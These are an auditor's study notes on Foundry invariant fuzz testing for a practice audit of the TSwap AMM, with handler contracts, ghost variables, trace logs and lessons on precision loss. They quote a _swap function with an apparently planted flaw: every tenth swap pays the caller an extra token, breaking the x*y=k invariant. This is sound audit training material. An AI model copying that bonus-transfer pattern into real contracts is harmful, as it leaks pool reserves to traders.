## Attack Vectors and Learning

# 1 FORGE CLEAN, ARITHMETIC OVERFLOW WHEN FUZZING, GHOST VARIABLES, SIMPLIFYING CALCULATIONS IN SOLIDITY AS MUCH AS POSSIBLE, INVARIANTS COMPARE EXPECTED TO ACTUAL, FALSE POSITIVES, PRECISION LOSS

All this practice I did was what helped me write the invariant for this tswap audit. I used this to test the invariant in the readme which said "Our system works because the ratio of Token A & WETH will always stay the same. Well, for the most part. Since we add fees, our invariant technially increases." I asserted this in the test in the Tswapinvarianttests.t.sol file and set up all the tests in the Handler.sol contract. You can go check that out in your own time in the 5-tswap-audit directory.

Before I started testing with invariants for this audit, to practice invariant testing, i went to the sc-exploits-minimized directory that i cloned from cyfrin github and my aim was to test the invariant in the HandlerStateFuzzCatches contract. See contract below:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/*
 * This contract represents a vault for ERC20 tokens.
 *
 * INVARIANT: Users must always be able to withdraw the exact balance amout out.
 */
contract HandlerStatefulFuzzCatches {
    error HandlerStatefulFuzzCatches__UnsupportedToken();

    using SafeERC20 for IERC20;

    mapping(IERC20 => bool) public tokenIsSupported;
    mapping(address user => mapping(IERC20 token => uint256 balance)) public tokenBalances;

    modifier requireSupportedToken(IERC20 token) {
        if (!tokenIsSupported[token]) revert HandlerStatefulFuzzCatches__UnsupportedToken();
        _;
    }

    constructor(IERC20[] memory _supportedTokens) {
        for (uint256 i; i < _supportedTokens.length; i++) {
            tokenIsSupported[_supportedTokens[i]] = true;
        }
    }

    function depositToken(IERC20 token, uint256 amount) external requireSupportedToken(token) {
        tokenBalances[msg.sender][token] += amount;
        token.safeTransferFrom(msg.sender, address(this), amount);
    }

    function withdrawToken(IERC20 token) external requireSupportedToken(token) {
        uint256 currentBalance = tokenBalances[msg.sender][token];
        tokenBalances[msg.sender][token] = 0;
        token.safeTransfer(msg.sender, currentBalance);
    }
}


```

To do this, i used handler based stateful fuzz testing to do this. This was my test file:

```javascript
//SDPX-License-Identifier: MIT

//SDPX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console2} from "lib/forge-std/src/Test.sol";
import {HandlerStatefulFuzzCatches} from "../../src/invariant-break/HandlerStatefulFuzzCatches.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {HandlerContract} from "./HandlerContract.sol";

contract HandlerStatefulFuzzTest is Test {
    HandlerStatefulFuzzCatches public handlerStatefulFuzzCatches;
    ERC20Mock public token;
    HandlerContract public handlerContract;

    function setUp() public {
        token = new ERC20Mock();
        IERC20[] memory supportedTokens = new IERC20[](1);
        supportedTokens[0] = token;
        handlerStatefulFuzzCatches = new HandlerStatefulFuzzCatches(
            supportedTokens
        );
        handlerContract = new HandlerContract(
            address(handlerStatefulFuzzCatches),
            token
        );
        targetContract(address(handlerContract));
    }

    function invariant_usermustwithdrawamount() public view {
        assert(
            handlerContract.checknum(handlerContract.withdrawer()) ==
                handlerContract.withdrawamount(handlerContract.withdrawer())
        );
    }
}

```

This was my handler contract:

```javascript
//SDPX-License-Identifier: MIT

//SDPX-License-Identifier: MIT

pragma solidity 0.8.20;

import {HandlerStatefulFuzzCatches} from "../../src/invariant-break/HandlerStatefulFuzzCatches.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Test, console2} from "lib/forge-std/src/Test.sol";

contract HandlerContract is Test {
    address public targetContract;
    ERC20Mock public supportedtoken;
    uint256 public balance;
    uint256 public amount;
    address public withdrawer;
    mapping(address => uint256) public withdrawamount;
    mapping(address => uint256) public depositamount;
    mapping(address => uint256) public balancebefore;
    mapping(address => uint256) public balanceafter;
    mapping(address => uint256) public checknum;
    bool public hasdeposited;

    constructor(address _target, ERC20Mock _supportedtoken) {
        targetContract = _target;
        supportedtoken = _supportedtoken;
    }

    function depositToken(uint256 number) public {
        vm.startPrank(msg.sender);
        withdrawer = msg.sender;
        vm.assume(number < type(uint256).max);
        supportedtoken.mint(msg.sender, number);
        supportedtoken.approve(targetContract, number);
        HandlerStatefulFuzzCatches(targetContract).depositToken(
            supportedtoken,
            number
        );
        balancebefore[withdrawer] = supportedtoken.balanceOf(withdrawer);
        depositamount[withdrawer] += number;
        vm.stopPrank();
    }

    function withdrawToken() public {
        vm.startPrank(msg.sender);
        withdrawer = msg.sender;

        HandlerStatefulFuzzCatches(targetContract).withdrawToken(
            supportedtoken
        );
        withdrawamount[withdrawer] = depositamount[withdrawer];
        if (depositamount[withdrawer] == 0) {
            balanceafter[withdrawer] = 0;
        } else {
            balanceafter[withdrawer] = supportedtoken.balanceOf(withdrawer);
        }
        depositamount[withdrawer] = 0;
        checknum[withdrawer] =
            balanceafter[withdrawer] -
            balancebefore[withdrawer];
        vm.stopPrank();
    }
}


```

Notice how in the handler, there are variables i declared like the checknum mapping, the withdrawer variable, etc. These variables are not present in the HandlerStatefulFuzzCatches contract but i used them in my handler. the withdrawer variable was used to keep track of who the current msg.sender was because with invariant stateful testing, there are different random addresses used with each call so i needed to track each address which is what that variable was for. The checknum mapping was used to check the difference between balance before and after the withdrawal of the withdrawer. this checknum value was compared to the amount that the user deposited in the withdrawer mapping. These values being the same is what proves the invariant and to do this, i needed these variables that werent in the HandlerStatefulFuzzCatches contract and declared them in the Handler contract. These sort of variables are known as ghost variables so keep that in mind.

When running this test with fail_on revert set to true, i ended up with an arithmetic overflow error because the fuzzer tried to enter random values that when added to the token balance of the user in the tokenbalances array, there would be an overflow which is caught by the solidity compiler. With these errors what you have to keep in mind that we dont rreally care about these errors in our invariant tests because our main aim is to see if the invariant (the assert statement) ever fails at any state of the contract. So any random errors like this dont really matter. All i did was set fail_on_revert in the foundry.toml to false. With this, as you know, any random errors get ignored. The only time it would break is if our invariant in the assert statement gets broken. It is always good to start with fail_on_revert set to true to see what errors cause the revert and see if they are errors we can safely ignore or if you need to use vm.assume or bound before setting it to false again. Be careful with fail_on_revert set to false though and make sure to check the results and see how many calls revert to make sure a good number of calls dont revert so tyou can confidently say that the invariant doesnt break with sufficient amount of calls.

Another error I ran into was that after getting the overflow error and then changing fail_on_revert to false and running the test again, i got this error :
[FAIL. Reason: invariant_usermustwithdrawamount persisted failure revert]

I had no idea what this meant but after research, i found that sometimes foundry can maintain the previous state in its cache so i had to clear the cache with forge clean before rerunning the test and everything ran as expected. see https://github.com/Cyfrin/foundry-full-course-cu/discussions/1959

Lets talk about how I used all of this to find a bug in the tswap protocol. I will start by talking about my initial approach which was wrong and we will discuss what the problems were and how I solved them and the learnings.

My initial invariant tests were :

```javascript
function setUp() public {
        io10 = new ERC20Mock();
        wethtoken = new ERC20Mock();
        poolFactory = new PoolFactory(address(wethtoken));
        io10wethpooladdy = poolFactory.createPool(address(io10));
        address user1 = vm.addr(1);
        vm.startPrank(user1);
        io10.mint(user1, 200 * DECIMALS);
        io10.approve(io10wethpooladdy, 200 * DECIMALS);
        wethtoken.mint(user1, 100 * DECIMALS);
        wethtoken.approve(io10wethpooladdy, 100 * DECIMALS);
        TSwapPool(io10wethpooladdy).deposit(
            100 * DECIMALS,
            100 * DECIMALS,
            200 * DECIMALS,
            1 days
        );
        handler = new Handler(
            io10wethpooladdy,
            address(wethtoken),
            address(io10)
        );
        vm.stopPrank();
        targetContract(address(handler));
    }

    function invariant_depositfunctioninvariantTswap() public view {
        // Check that wethReserves is not zero
        if (
            handler.wethReserves() == 0 ||
            (handler._wethdeposit() + handler.wethReserves()) == 0
        ) {
            return;
        }
        uint256 left = handler.tokentopairreserves() / handler.wethReserves();
        uint256 right = (handler.pooltokenstodeposit() +
            handler.tokentopairreserves()) /
            (handler._wethdeposit() + handler.wethReserves());

        assert(left == right);
    }

    function invariant_withdrawfunctioninvariantTswap() public view {
        // Check that wethReserves is not zero
        if (
            handler.wethReserves() == 0 ||
            (handler.wethToWithdraw() + handler.wethReserves()) == 0
        ) {
            return;
        }
        uint256 left = handler.tokentopairreserves() / handler.wethReserves();
        uint256 right = (handler.tokentopairreserves() -
            handler.poolTokensToWithdraw()) /
            (handler.wethReserves() - handler.wethToWithdraw());

        assert(left == right);
    }


function invariant_coreinvariantTswap() public {
uint256 left = handler.inputReserves() * handler.outputReserves();
uint256 right = (handler.inputReserves() + handler._inputAmount()) *
(handler.outputReserves() - handler._outputAmount());

        if (left != right) {
            emit LogMismatch(left, right);
        }
        assert(left == right);
    }

    function invariant_coreinvariantTswap() public {

        uint256 scaledbeta = (handler._outputAmount() * DECIMALS) /
            handler.outputReserves();

        // Calculate denominator
        uint256 denominator = DECIMALS - scaledbeta;

        // Final result
        uint256 result = (scaledbeta * DECIMALS) / denominator;
        result = (result * handler.inputReserves()) / DECIMALS;
        if (handler._inputAmount() != result) {
            emit LogIntermediate(
                handler._outputAmount(),
                handler.outputReserves(),
                handler.inputReserves(),
                scaledbeta,
                denominator,
                result
            );
        }

        assert(handler._inputAmount() == result);}

```

Once you see invariant tests like this, alarm bells should be going off in your head that these invariants arent defined correctly for 2 reasons. The first is that i initially designed a different invariant for each function. As you will see above, i have an invariant for the deposit function, another one for the withdraw function (which was the same as the deposit one but using different variables) and the invariant*coreinvariantTswap which was to test the swaps. The initial reason I did this was because if you go into the read me and look at the core invariant, it says that x * y = (x + ∆x) \_ (y − ∆y) is the core invariant of the protocol which means that this should always hold no matter what state the contract is in.

Looking at this formula, it assumes that if x goes up in the lp, then y must go down and the idea around this was a swap idea. If a user wants token y from the pool, they have to put token x into the pool. it doesnt account for the deposit function where both token x and token y are put into the pool or token x and y are withdrawn from the pool. So my idea was just to compare the ratios of tokens x and y before and after a deposit and a withdrawal and make sure the ratios stay the same because that is essentially what the invariant is trying to do. So i had my initial handler contract as:

```javascript

//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";

contract Handler is Test {
    TSwapPool tswappool;
    uint256 public constant MINIMUM_WETH_LIQUIDITY = 1_000_000_000;
    uint256 public pooltokenstodeposit;
    ERC20Mock public i_wethToken;
    ERC20Mock public i_tokentopair;
    uint256 public _wethdeposit;
    uint256 public wethReserves;
    uint256 public tokentopairreserves;
    uint256 public liquidityTokensToMint;
    uint256 public wethToWithdraw;
    uint256 public poolTokensToWithdraw;
    uint256 public inputReserves;
    uint256 public outputReserves;
    IERC20 public inputToken;
    IERC20 public outputToken;


    constructor(address _tswappool, address _wethToken, address _tokentopair) {
        tswappool = TSwapPool(_tswappool);
        i_wethToken = ERC20Mock(_wethToken);
        i_tokentopair = ERC20Mock(_tokentopair);
    }

     function deposit(
        uint256 wethToDeposit,
        uint256 minimumLiquidityTokensToMint,
        uint256 maximumPoolTokensToDeposit,
        uint64 deadline
    ) public {
        vm.startPrank(msg.sender);
        vm.assume(wethToDeposit > MINIMUM_WETH_LIQUIDITY);
        i_wethToken.mint(msg.sender, wethToDeposit);
        i_wethToken.approve(address(tswappool), wethToDeposit);
        wethReserves = i_wethToken.balanceOf(address(tswappool));
        tokentopairreserves = i_tokentopair.balanceOf(address(tswappool));
        if (wethReserves == 0 && tokentopairreserves == 0) {
            pooltokenstodeposit = maximumPoolTokensToDeposit;
            liquidityTokensToMint = wethToDeposit;
        } else {
            pooltokenstodeposit = tswappool.getPoolTokensToDepositBasedOnWeth(
                wethToDeposit
            );
            liquidityTokensToMint =
                (wethToDeposit * tswappool.totalLiquidityTokenSupply()) /
                wethReserves;
        }
        maximumPoolTokensToDeposit = bound(
            maximumPoolTokensToDeposit,
            pooltokenstodeposit,
            type(uint256).max
        );
        i_tokentopair.mint(msg.sender, pooltokenstodeposit);
        i_tokentopair.approve(address(tswappool), pooltokenstodeposit);

        vm.assume(minimumLiquidityTokensToMint < liquidityTokensToMint);
        deadline = uint64(bound(deadline, block.timestamp, type(uint64).max));

        tswappool.deposit(
            wethToDeposit,
            minimumLiquidityTokensToMint,
            maximumPoolTokensToDeposit,
            deadline
        );
        _wethdeposit = wethToDeposit;
        vm.stopPrank();
    }

    function withdraw(
        uint256 liquidityTokensToBurn,
        uint256 minWethToWithdraw,
        uint256 minPoolTokensToWithdraw,
        uint64 deadline
    ) public {
        wethReserves = i_wethToken.balanceOf(address(tswappool));
        tokentopairreserves = i_tokentopair.balanceOf(address(tswappool));
        if (tswappool.totalLiquidityTokenSupply() == 0) {
            return;
        }
        vm.startPrank(msg.sender);
        liquidityTokensToBurn = bound(
            liquidityTokensToBurn,
            0,
            type(uint256).max
        );
        wethToWithdraw =
            (liquidityTokensToBurn *
                i_wethToken.balanceOf(address(tswappool))) /
            tswappool.totalLiquidityTokenSupply();
        poolTokensToWithdraw =
            (liquidityTokensToBurn *
                i_tokentopair.balanceOf(address(tswappool))) /
            tswappool.totalLiquidityTokenSupply();

        vm.assume(minWethToWithdraw < wethToWithdraw);
        minPoolTokensToWithdraw = bound(
            minPoolTokensToWithdraw,
            poolTokensToWithdraw,
            type(uint256).max
        );
        deadline = uint64(bound(deadline, block.timestamp, type(uint64).max));

        tswappool.withdraw(
            liquidityTokensToBurn,
            minWethToWithdraw,
            minPoolTokensToWithdraw,
            deadline
        );
        vm.stopPrank();
    } }

```

At this point, I hadnt written any handler functions for the swaps. I only tested the invariants for the deposit and withdraw functions and both of these invariants worked perfectly but the reason i said they were badly defined invariants were for 2 reasons as I said above. The first was that you should NEVER have 2 invariants that are testing the same thing. the deposit invariant and the withdraw invariant are both asserting the same thing. They are checking the ratios before and after the function to make sure the ratios are the same. Why do you need 2 seperate invariants to check this ? This was the firstr alarm bell. the second was that there shouldnt be many calculations done in the invariant function itself. This is very important. if you look at the deposit and withdraw invariants, notice how we are doing a bunch of calculations and then asserting to see if one side is equal to the other side.

With invariant testing, this is a big no no. Try to avoid this as much as possible. The aim is to do any calculations you want to make inside the handler contract using ghost variables. In the invariant test, you should simply be asserting the ghost variables from the handler and comparing them. If you arent doing this, then something is wrong. If you look at the example from the sc_exploit_minimised directory i linked above, notice how all the calculations were done inside the handler contract using ghost variables and then all we did in the invariant test was to compare the variables we needed to be true based on the invariant. If your invariant test doesnt look like that, then you are doing something wrong.

This becomes extremely evident when i tried to define the invariant*coreinvariantTswap test. I tried replicating the core invariant by trying to make sure x * y = (x + ∆x) \_ (y − ∆y) was always true. This was not the worst idea in the world but there were some misunderstanding of how to test an invariant by me in this case. See the output below:

[22432] Tswapinvarianttest::invariant_coreinvariantTswap()
├─ [2363] Handler::\_outputAmount() [staticcall]
│ └─ ← [Return] 1474262892 [1.474e9]
├─ [2339] Handler::outputReserves() [staticcall]
│ └─ ← [Return] 100000000000000000000 [1e20]
├─ [2383] Handler::inputReserves() [staticcall]
│ └─ ← [Return] 200000000000000000000 [2e20]
├─ [2362] Handler::\_inputAmount() [staticcall]
│ └─ ← [Return] 2957397979 [2.957e9]
├─ [363] Handler::\_outputAmount() [staticcall]
│ └─ ← [Return] 1474262892 [1.474e9]
├─ [339] Handler::outputReserves() [staticcall]
│ └─ ← [Return] 100000000000000000000 [1e20]
├─ [383] Handler::inputReserves() [staticcall]
│ └─ ← [Return] 200000000000000000000 [2e20]
├─ emit LogIntermediate(outputAmount: 1474262892 [1.474e9], outputReserves: 100000000000000000000 [1e20], inputReserves: 200000000000000000000 [2e20], scaledbeta: 14742628 [1.474e7], denominator: 999999999985257372 [9.999e17], result: 2948525600 [2.948e9])
├─ [362] Handler::\_inputAmount() [staticcall]
│ └─ ← [Return] 2957397979 [2.957e9]
└─ ← [Revert] panic: assertion failed (0x01)

The problem was that i was comparing expected to expected. What I mean is that based on the invariant, ∆x = (β/(1-β)) \* x. This is what we expect. On inspection of the TSwapPool contract, this is what is calculated in the getOutputAmountBasedOnInput and getInputAmountBasedOnOutput functions. I will talk more about these functions later and why the way they are designed is important.

so the \_inputAmount() ghost variable was the result of the getInputAmountBasedOnOutput function which i recalculated in the handler function. In the invariant test, I was trying to compare \_inputAmount to result and result was simply me trying to recalculate ∆x = (β/(1-β)) \_ x as you will see above. As a result, I was comparing the expected value to a recalculation of the same expected value which was stupid. The reason was because I didnt know that the getInputAmountBasedOnOutput function was actually a simplified version of ∆x = (β/(1-β))\*x. Keep that simplified word in mind as it will soon become extremely important. You need to keep in mind when testing invariants that the aim is to compare an expected value (invariant) to an actual value (value that the contract is producing).

Even with trying to do expected == expected in the invariant, you would still expect the invariant to pass and in this case, this would be known as a false positive because the invariant is passing but that is because you arent testing for the correct thing. As I said earlier, it needs to be expected == actual. What threw me off was that expected != expected in my invariant test. If you see the output above, \_inputAmount = 2957397979 and result = 2948525600. These values are almost similar but not the same and you might be thinking well if we are comparing the same calculations, why tf are they not the same ? The amount the user puts in the pool (\_inputAmount) is bigger than what we calculated (result).

There are 2 main reasons for this. The first is that if you look in the getInputAmountBasedOnOutput function, you will see that it returns the following:

```javascript
(inputReserves * outputAmount * 10000) /
  ((outputReserves - outputAmount) * 997);
```

Notice how the numerator and denominator are both multiplied by a value. These values are used to represent protocol fees. so this was the obvious reason why the \_inputAmount and my result werent returning the same thing. Due to the fees, the user is meant to input more funds than when fees arent considered which is what my result formula did. This was the reason for the discrepancy.

Another thing you will notice is how excluding the fees, the protocols formula when computing ∆x = (β/(1-β))\*x was:

```javascript
(inputReserves * outputAmount) / (outputReserves - outputAmount);
```

and mine was :

```javascript
 uint256 scaledbeta = (handler._outputAmount() * DECIMALS) /
            handler.outputReserves();

        // Calculate denominator
        uint256 denominator = DECIMALS - scaledbeta;

        // Final result
        uint256 result = (scaledbeta * DECIMALS) / denominator;
        result = (result * handler.inputReserves()) / DECIMALS;
```

This is where the idea of precision lossand simplifying formulae becomes very important. In solidity, when doing calculations, you need to be wary of precision loss and I will explain how precision loss could mess up my false positive from passing lol. If you look in the core invariant test i posted above, you will see how I calculated the result which is consistent with ∆x = (β/(1-β))\*x. The potential problem was the difference between how the protocol calculated it and how simple their formula looked in compariosn with how complex and how many lines mine took. In reality, the 2 formulae should return the same output but when doing calculations in solidity, you need to try to shorten the calculations as much as possible to prevent precision loss. The more lines of calculation you have, the more likely your code could be susceptible to precision loss.

In the protocol calculation, they managed to simplify x _ y = (x + ∆x) _ (y − ∆y) to:

```javascript
(inputReserves * outputAmount) / (outputReserves - outputAmount);
```

You dont need to wory about how the math worked but if you think about it and try to refactor it yourself, its actually not hard at all. Precision loss occurs when performing arithmetic operations (especially division) in Solidity because it only supports integer arithmetic (no floating-point numbers). In our calculation, we perform division twice which can increase the chances of precision loss compared to the formula the protocol used which only divided once. I am not saying precision loss will definitely happen with our formula becuase we took the precaution by scaling up all divisions by multiplying the numerator by 1e18 so in fact, precision loss most probably wouldnt affect us at all using our formula but the point was to notice the simplicity of their formula compared to mine. You should always note that whenever you see a formula, your first thought should be how you can refactor the formula to make it simpler. This is similar to when you look at code and you know this so we arent going over it again. This is something to keep in mind.

With all of this mind, I refactored all my invariant tests and this was the new file:

```javascript
//SDPX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {Handler} from "./Handler.sol";

contract Tswapinvarianttest is Test {
    ERC20Mock public io10;
    ERC20Mock public wethtoken;
    PoolFactory public poolFactory;
    TSwapPool public io10wethPool;
    address public io10wethpooladdy;
    Handler public handler;
    uint256 DECIMALS = 10 ** 18;

    event LogIntermediate(
        uint256 outputAmount,
        uint256 outputReserves,
        uint256 inputReserves,
        uint256 scaledbeta,
        uint256 denominator,
        uint256 result
    );

    function setUp() public {
        io10 = new ERC20Mock();
        wethtoken = new ERC20Mock();
        poolFactory = new PoolFactory(address(wethtoken));
        io10wethpooladdy = poolFactory.createPool(address(io10));
        address user1 = vm.addr(1);
        vm.startPrank(user1);
        io10.mint(user1, 200 * DECIMALS);
        io10.approve(io10wethpooladdy, 200 * DECIMALS);
        wethtoken.mint(user1, 100 * DECIMALS);
        wethtoken.approve(io10wethpooladdy, 100 * DECIMALS);
        TSwapPool(io10wethpooladdy).deposit(
            100 * DECIMALS,
            100 * DECIMALS,
            200 * DECIMALS,
            1 days
        );
        handler = new Handler(
            io10wethpooladdy,
            address(wethtoken),
            address(io10)
        );
        vm.stopPrank();
        targetContract(address(handler));
    }

    function invariant_coreinvariantTswap() public {
        assert(handler._expectedinputAmount() == handler._actualinputAmount());
    }

    function invariant_coreinvariantTswap2() public {
        assert(
            handler._expectedoutputAmount() == handler._actualoutputAmount()
        );
    }
}


```

In all the invariant tests, notice how nothing was calculated in any of them. All cacluations were done using ghost variables in the handler contract. see the swap functions in the handler contract below:

```javascript
function swapExactInput(
        uint256 number,
        uint256 inputAmount,
        uint256 minOutputAmount,
        uint64 deadline
    ) public {
        vm.startPrank(msg.sender);
        deadline = uint64(bound(deadline, block.timestamp, type(uint64).max));
        IERC20[] memory tokenlist = new IERC20[](2);
        tokenlist[0] = i_tokentopair;
        tokenlist[1] = i_wethToken;
        uint256 inputtokenindex = number % 2;
        if (inputtokenindex == 0) {
            inputToken = tokenlist[0];
            outputToken = tokenlist[1];
        } else {
            inputToken = tokenlist[1];
            outputToken = tokenlist[0];
        }

        inputReserves = inputToken.balanceOf(address(tswappool));
        outputReserves = outputToken.balanceOf(address(tswappool));

        inputAmount = bound(inputAmount, 1, type(uint64).max);
        ERC20Mock(address(inputToken)).mint(msg.sender, inputAmount);
        ERC20Mock(address(inputToken)).approve(address(tswappool), inputAmount);

        uint256 outputAmount = tswappool.getOutputAmountBasedOnInput(
            inputAmount,
            uint256(inputReserves),
            uint256(outputReserves)
        );
        _expectedinputAmount = int256(inputAmount);
        _expectedoutputAmount = int256(-1) * int256(outputAmount);

        vm.assume(minOutputAmount < outputAmount);
        tswappool.swapExactInput(
            inputToken,
            inputAmount,
            outputToken,
            minOutputAmount,
            deadline
        );
        uint256 endinginputreserves = inputToken.balanceOf(address(tswappool));
        uint256 endingoutputreserves = outputToken.balanceOf(
            address(tswappool)
        );

        _actualinputAmount =
            int256(endinginputreserves) -
            int256(inputReserves);
        _actualoutputAmount =
            int256(endingoutputreserves) -
            int256(outputReserves);

        vm.stopPrank();
    }

    function swapExactOutput(
        uint256 number,
        uint256 outputAmount,
        uint64 deadline
    ) public {
        vm.startPrank(msg.sender);
        deadline = uint64(bound(deadline, block.timestamp, type(uint64).max));
        IERC20[] memory tokenlist = new IERC20[](2);
        tokenlist[0] = i_tokentopair;
        tokenlist[1] = i_wethToken;
        uint256 inputtokenindex = number % 2;
        if (inputtokenindex == 0) {
            inputToken = tokenlist[0];
            outputToken = tokenlist[1];
        } else {
            inputToken = tokenlist[1];
            outputToken = tokenlist[0];
        }
        inputReserves = inputToken.balanceOf(address(tswappool));
        outputReserves = outputToken.balanceOf(address(tswappool));
        outputAmount = bound(outputAmount, 1, type(uint64).max);
        _expectedoutputAmount = int256(-1) * int256(outputAmount);

        _expectedinputAmount = int256(
            tswappool.getInputAmountBasedOnOutput(
                outputAmount,
                uint256(inputReserves),
                uint256(outputReserves)
            )
        );
        ERC20Mock(address(inputToken)).mint(
            msg.sender,
            uint256(_expectedinputAmount)
        );
        ERC20Mock(address(inputToken)).approve(
            address(tswappool),
            uint256(_expectedinputAmount)
        );

        tswappool.swapExactOutput(
            inputToken,
            outputToken,
            outputAmount,
            deadline
        );

        uint256 endinginputreserves = inputToken.balanceOf(address(tswappool));
        uint256 endingoutputreserves = outputToken.balanceOf(
            address(tswappool)
        );

        _actualinputAmount =
            int256(endinginputreserves) -
            int256(inputReserves);
        _actualoutputAmount =
            int256(endingoutputreserves) -
            int256(outputReserves);
        vm.stopPrank();
    }

```

Notice how I incorporated the expected == actual invariant strategy. We confirmed that the expected value was from the getInputAmountBasedOnOutput function which was consistent with the x*y = (x + ∆x)*(y − ∆y) invariant + fees and we were able to confirm this. So we have \_inputAmount as our expected value. we now need the actual value that the contract produces. to get this, we computed the token balances of the contract before and after carrying out the swap and made sure the difference was the same as the expected value from the getInputAmountBasedOnOutput function. This is how we compared expected value to actual value properly.

Also notice how i bounded both the input amount and output amounts to the max uint64. This was mainly because i didnt want any weird math problems from occuring but this isnt too important. the max uint64 is about 18eth which is a pretty low bound when you think about it but in reality, it doesnt change much for the invariant we are trying to test. These are all things we had to consider when writing up the handler contract and will vary based on what your invariant is.

Also note how with \_expectedoutputAmount , we multiplied it by -1. the reason is because the output token is the amount of the token that is leaving the pool so it is going to be negative. This is the reason we used int256 instead of uint256. int256 allows for negative values but uint256 does not. This was a very important part of our invariant tests.

When I ran it like this, the assertion passed at first but then i decided to increase the range by chainging the fuzz seed and increasing the number of runs and the assertion failed after a few runs though but not for any problem from my end because at this point, I was sure that I was writing the tests as expected. So i looked at the logs from the failed assertion and found the following:

├─ [51051] TSwapPool::swapExactOutput(ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 18446744073709551613 [1.844e19], 2917316 [2.917e6])
│ ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2]) [staticcall]
│ │ └─ ← [Return] 223077794301399668139 [2.23e20]
│ ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2]) [staticcall]
│ │ └─ ← [Return] 236454610873578577149 [2.364e20]
│ ├─ [28004] ERC20Mock::transfer(0x000000000000000000000000000000031db38592, 1000000000000000000 [1e18])
│ │ ├─ emit Transfer(from: TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], to: 0x000000000000000000000000000000031db38592, value: 1000000000000000000 [1e18])
│ │ └─ ← [Return] true
│ ├─ emit Swap(swapper: 0x000000000000000000000000000000031db38592, tokenIn: ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amountTokenIn: 189325337865274422971 [1.893e20], tokenOut: ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountTokenOut: 18446744073709551613 [1.844e19])
│ ├─ [6954] ERC20Mock::transferFrom(0x000000000000000000000000000000031db38592, TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], 189325337865274422971 [1.893e20])
│ │ ├─ emit Transfer(from: 0x000000000000000000000000000000031db38592, to: TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], value: 189325337865274422971 [1.893e20])
│ │ └─ ← [Return] true
│ ├─ [3304] ERC20Mock::transfer(0x000000000000000000000000000000031db38592, 18446744073709551613 [1.844e19])
│ │ ├─ emit Transfer(from: TSwapPool: [0x4f81992FCe2E1846dD528eC0102e6eE1f61ed3e2], to: 0x000000000000000000000000000000031db38592, value: 18446744073709551613 [1.844e19])
│ │ └─ ← [Return] true
│ └─ ← [Return] 189325337865274422971 [1.893e20]

Notice how when swapExactOutput was called , if you look at the \_swap function that is called in this function, it is supposed to do 2 transfers. One transferfrom which takes the input tokens from the user and one transfer that transfers the output token to the user. In these logs, you can see 3 transfer events emitted and 3 transfer functions are called which doesnt make sense. So i looked at the \_swap function which was:

```javascript
/**
     * @notice Swaps a given amount of input for a given amount of output tokens.
     * @dev Every 10 swaps, we give the caller an extra token as an extra incentive to keep trading on T-Swap.
     * @param inputToken ERC20 token to pull from caller
     * @param inputAmount Amount of tokens to pull from caller
     * @param outputToken ERC20 token to send to caller
     * @param outputAmount Amount of tokens to send to caller
     */
    function _swap(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 outputAmount
    ) private {
        if (
            _isUnknown(inputToken) ||
            _isUnknown(outputToken) ||
            inputToken == outputToken
        ) {
            revert TSwapPool__InvalidToken();
        }

        swap_count++;
        if (swap_count >= SWAP_COUNT_MAX) {
            swap_count = 0;
            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
        }
        emit Swap(
            msg.sender,
            inputToken,
            inputAmount,
            outputToken,
            outputAmount
        );

        inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
        outputToken.safeTransfer(msg.sender, outputAmount);
    }
```

in the natspec, you will see that it says Every 10 swaps, we give the caller an extra token as an extra incentive to keep trading on T-Swap. This is what breaks the assertion. In the code, you can see a swap_count variable being incremented and once it goes past a certain threshold, an extra amount is sent to msg.sender. This is where that extra transfer event gets emitted from and why our assertion doesnt pass. This token incentive is what breaks the invariant of this protocol.

This is how we were able to find a bug by simply using invariant testing. This type of testing MUST become second nature to you and you should be invariant testing before you start manual testing because you can uncover bugs even before you start manual testing and although you could say setting up invariant tests is long, if you are looking at a codebase with over 1k nsloc, set up a correct invariant test will help you find bugs even before you start manual review. You need to make use of all the tools you have to find bugs and as we discussed using tools like slither, invariant testing is another tool you need to master and this will come with practice and using different fuzzers like echidna and getting used to all the features of the foundry fuzzer and how all of these work. This is crucial to your auditing development. All the concepts I covered here are also extremely important with invariant tests ans you must review all of them.

# 2 WEIRD ERC20's (NOT ALL ERC20's are the same), Introduction to ERC777 and performing reentrancies on ERC20's

